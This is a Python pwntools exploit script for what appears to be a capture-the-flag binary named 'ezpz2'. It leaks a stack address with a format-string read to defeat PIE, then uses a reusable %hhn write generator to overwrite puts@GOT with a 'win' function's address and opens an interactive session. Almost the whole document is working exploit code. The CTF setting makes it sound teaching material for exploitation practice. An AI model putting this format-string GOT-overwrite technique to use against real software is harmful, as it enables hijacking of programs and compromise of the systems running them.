"""
MD5 of Binary: e07c53502854ebbcb013591d73e897af

Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
"""

'''
PIE is enabled, meaning that our base address has been randomised (noooo!).  
We'll need to leak some address, which thankfully is done in `print_flag`, which is where printf is executed.  
0x131b can be subtracted from third address on the stack, which will give us the base address.
We can then figure out the `win` address, and the `puts@GOT` address, then perform a printf injection to points `puts@GOT` to our `win` function
'''

from pwn import *
import re

p = process("./ezpz2")
#p = remote('plsdonthaq.me', 24104)

# Underflow
# - Read 0xFE bytes into some_buffer

# Overflow
# - Copy some_buffer into ebp-0x107, STACK CHECK

# Print Flag
# - Prints ebp-0x107 (The buffer)

def splitByte4(byte4, *, littleEndian = True):
    assert(type(byte4) is int)
    result = []
    while byte4:
        result.append(byte4 & 0xFF)
        byte4 >>= 8
    return result if littleEndian else result[::-1]

def packFmt(byteArray, pad=0):
    items = [(byteArray[i], i) for i in range(len(byteArray))]
    return sorted(items, key=lambda t: (t[0] - pad) & 0xFF)

def genFmt(byte4, where, stackStart, pad=0):
    payload = b''
    payload += p32(where+0)
    payload += p32(where+1)
    payload += p32(where+2)
    payload += p32(where+3)
    dataLen = len(payload) + pad
    packedValues = packFmt(splitByte4(byte4), dataLen)
    for value in packedValues:
        change = (value[0] - dataLen) & 0xFF
        part = f'%{change}c'.encode() if change else b''
        payload += part
        payload += f'%{stackStart + value[1]}$hhn'.encode()
        dataLen += change
    return payload

def wait():
    p.recvuntil(b'Enter your choice, (or press enter to refresh): ')

wait()

p.sendline(b"U")
p.sendline(b"%3$p")
wait()

p.sendline(b"P")
p.recvuntil(b'Dobby has a question for you\n')

addr = int(p.recvline(keepends=False),16)
print(f"Leaked code address was {hex(addr)}")
pause()
base = addr - 0x131b
print(f"Calculated base address is {hex(base)}")

win_offset = 0x1369
win_addr = base + win_offset
print(f"Calculated win address is {hex(win_addr)}")

puts_got_offset = 0x3614
puts_got_address = base + puts_got_offset
print(f"Calculated puts@GOT address is {hex(puts_got_address)}")

wait()

payload = b'...'
payload += genFmt(win_addr, puts_got_address, 5, pad=3)

p.sendline('U')
p.sendline(payload)
wait()
p.sendline('P')

p.interactive()
